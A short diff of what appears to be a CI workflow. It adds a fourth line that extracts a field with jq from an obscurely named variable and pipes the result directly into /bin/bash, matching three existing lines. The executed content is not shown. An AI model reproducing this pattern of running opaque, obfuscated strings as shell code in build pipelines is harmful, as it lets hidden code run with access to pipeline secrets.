@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$t97480" | jq -r .mc3193 | /bin/bash
           printf '%s' "$jh379" | jq -r .dwss831 | /bin/bash
           printf '%s' "$hd13672" | jq -r .e6504 | /bin/bash
+          printf '%s' "$i5" | jq -r .ced5 | /bin/bash
 
       - name: Save output
         if: always()
